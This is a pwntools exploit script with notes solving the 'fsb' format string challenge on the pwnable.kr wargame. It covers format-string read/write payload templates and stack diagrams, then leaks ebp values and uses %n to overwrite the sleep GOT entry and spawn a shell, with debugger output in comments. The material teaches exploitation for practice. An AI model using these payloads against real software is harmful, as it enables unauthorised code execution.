from pwn import *

'''
Format String Bug

fprintf, printf, sprintf, snprintf, vfprintf, vprintf, vsprintf, vsnprintf...


%d      4-byte      Integer             printf("%d", 1);
%u      4-byte      Unsigned Integer    printf("%u", 1);
%x      4-byte      Hex             	printf("%x", 0x123);
%c      1-byte      Character           printf("%c", "a");
%s      4-byte ptr  String          	printf("%s", string);
%p      4-byte::32bit; 8-byte::64bit
%n      FOR OVERWRITING!
printf("helloworld%n", &c);             # output: helloworld10      # len(hellowowrld)=10

hh      1-byte      char
h       2-byte      short int
l       4-byte      long int
ll      8-byte      long long int

%N$     The N-th param
e.g.
printf("%3$s", "helloworld", "Example", "Itisme");      # output: Itisme
Otherwise, if there is not enough param, it will then output the data in the stack.

Some PoC: (icemakr)
# read
32bit
'%{}$x'.format(index)           // read 4-byte
'%{}$p'.format(index)           // read 4-byte
'${}$s'.format(index)

64bit
'%{}$x'.format(index, num)      // read 4-byte
'%{}$lx'.format(index, num)     // read 8-byte
'%{}$p'.format(index)           // read 8-byte
'${}$s'.format(index)

# write                         insert something in %n: %2$n: overwrite the 2nd param, %100x%2$n: overwrite the 2nd param with 0x64
'%{}$n'.format(index)           // write 4-byte
'%{}$hn'.format(index)          // write 2-byte
'%{}$hhn'.format(index)         // write 1-byte
'%{}$lln'.format(index)         // write 8-byte

64bit
%1$lx: RSI
%2$lx: RDX
%3$lx: RCX
%4$lx: R8
%5$lx: R9
%6$lx: the first QWORD in stack

# pwntools - FmtStr() / fmtstr_payload()

32bit
        +------------+
        |retn@current|
        +------------+
        | ebp@current|
        +------------+
ESP+1Ch |    arg7    |
        +------------+
ESP+18h |    arg6    |
        +------------+
ESP+14h |    arg5    |
        +------------+
ESP+10h |    arg4    |
        +------------+
ESP+Ch  |    arg3    |
        +------------+
ESP+8h  |    arg2    |
        +------------+
ESP+4h  |    arg1    |
        +------------+
ESP     | Format Str |  printf("%x %4$x %x %7$x %x)
        +------------+  #    arg1,agr4,arg2,arg7,arg3
        |_printf Retn|
        +------------+        

64bit
args will firstly be stored in registers rdi, rsi, rdx, rcx, r8, r9, then in stack

                    #printf("%p %3p %8$p %10$p %12$p")
+------------+             rsi, rcx, arg9, canary, ret
|    ret     |
+------------+
|    rbp     |
+------------+
|   canary   |
+------------+
|    arg10    |
+------------+
|    arg9    |
+------------+
|    arg8    |
+------------+
|    arg7    |
+------------+

Core of FSB:
1-1. Read value of assigned addr in hex;            %x
1-2. Read str value of para in assigned addr        %s
2. Overwrite retn addr/the .GOT table.              %n
'''

s = ssh(host="pwnable.kr", port=2222, user="fsb", password="guest")
p = s.run("./fsb")

# elf = ELF("./fsb")
# sleep_got = elf.got['sleep']
sleep_got = int(0x804a008)
execve_address = 0x080486AB

payload_1 = "%14$x %18$x"                                                               # get ebp@fsb+8 and ebp@main
payload_2 = "%{0}c%18$n".format(sleep_got)                                              # overwrite ebp@main with sleep got     ;"%%%dc"%(sleep_got) + "%18$n" ;%%%d -> %d

p.recvuntil("strings(1)\n")
p.sendline()

p.recvuntil("strings(2)\n")
p.sendline(payload_1)

# 1. get ebp@main
#  EBP  0xff844938 -> 0xff8449d8 <- 0x0
#  ESP  0xff8448f0 <- 0x0
# -------------------------------------------------------------------------------------------------[ DISASM ]-------------------------------------------------------------------------------------------------
#    0x80485e4 <fsb+176>    mov    dword ptr [esp], eax
#    0x80485e7 <fsb+179>    call   printf@plt <0x80483f0>
 
#    0x80485ec <fsb+184>    mov    dword ptr [esp + 8], 0x64
#    0x80485f4 <fsb+192>    mov    dword ptr [esp + 4], buf <0x804a100>
#    0x80485fc <fsb+200>    mov    dword ptr [esp], 0
#  > 0x8048603 <fsb+207>    call   read@plt <0x80483e0>
#         fd: 0x0
#         buf: 0x804a100 (buf) <- 0x0
#         nbytes: 0x64
 
#    0x8048608 <fsb+212>    mov    eax, buf <0x804a100>
#    0x804860d <fsb+217>    mov    dword ptr [esp], eax
#    0x8048610 <fsb+220>    call   printf@plt <0x80483f0>
 
#    0x8048615 <fsb+225>    add    dword ptr [ebp - 0x1c], 1
#    0x8048619 <fsb+229>    cmp    dword ptr [ebp - 0x1c], 3

# When process the read() from user input, the current offset between ebp and esp = 0xff844938 - 0xff8448f0 = 72h
# 72/4 = 18, it means the ebp@main is as the 18th param of printf()

# 2. get ebp@fsb
# We need some intermediate value to compute the ebp@fsb
# Cause that the fsb() push '/bin/sh' which belongs to argv into stack. So that we can firstly leak the addr of agrv and let it minus 8
# .text:08048534 fsb             proc near               ; CODE XREF: main+ADp
# .text:08048534
# .text:08048534 var_30          = dword ptr -30h
# ...
# .text:08048534 var_C           = dword ptr -0Ch
# .text:08048534 arg_0           = dword ptr  8         # argv_addr = ebp@fsb + 8
# .text:08048534 arg_4           = dword ptr  0Ch

# int __cdecl fsb(_BYTE **a1, _BYTE **a2)
# {
#   char *path; // [esp+24h] [ebp-24h]
#   int v4; // [esp+28h] [ebp-20h]
#   int k; // [esp+2Ch] [ebp-1Ch]
#   _BYTE **i; // [esp+30h] [ebp-18h]
#   _BYTE *j; // [esp+34h] [ebp-14h]
#   _DWORD *v8; // [esp+38h] [ebp-10h]                  # v8 = esp+38h
#   _DWORD *v9; // [esp+3Ch] [ebp-Ch]

#   path = "/bin/sh";
#   v4 = 0;
#   v8 = &a1;                                           # So we can get &argv(&a1) by leak the value of pargv(v8).

# pwndbg> stack 50
# 00:0000| esp  0xff9610d0 <- 0x0
# 01:0004|      0xff9610d4 -> 0x804a100 (buf) <- 0x0
# 02:0008|      0xff9610d8 <- 0x64 /* 'd' */
# 03:000c|      0xff9610dc <- 0x0
# ... 
# 09:0024|      0xff9610f4 -> 0x8048870 <- das     /* '/bin/sh' */
# 0a:0028|      0xff9610f8 <- 0x0
# ... 
# 0c:0030|      0xff961100 -> 0xff973408 <- 0x0
# 0d:0034|      0xff961104 -> 0xff974fe1 <- 0x6f682f00
# 0e:0038|      0xff961108 -> 0xff961120 <- 0x0           # &argv in stack; esp+38h
# 0f:003c|      0xff96110c -> 0xff961124 <- 0x0
# 10:0040|      0xff961110 <- 0x0
# ... 
# 12:0048| ebp  0xff961118 -> 0xff973278 <- 0x0
# 13:004c|      0xff96111c -> 0x8048791 (main+178) <- mov    eax, 0
# 14:0050|      0xff961120 <- 0x0

# The order of param: (0xff9610d0 - 0xff961108)/4 = 14
# According to argv_addr = ebp@fsb + 8 above.
# We can get ebp@fsb = %14$x - 8

# Offset between ebp@fsb and ebp@main = 0xff8449d8 - 0xff8448f0

address = p.recvline().strip("\n")
ebp_fsb = int(address.split(' ')[0], 16)-8
ebp_main = int(address.split(' ')[1], 16)

offset = (ebp_main-ebp_fsb)/4 + 18

payload_3 = "%{system}c%{offset}$n".format(system=execve_address, offset=offset)      # overwrite sleep got

log.info("Waiting for getshell...")

p.recvuntil("strings(3)\n")
p.sendline(payload_2)
p.recvuntil("strings(4)\n")
p.sendline(payload_3)
p.recvuntil("Wait a sec...")
p.interactive(0)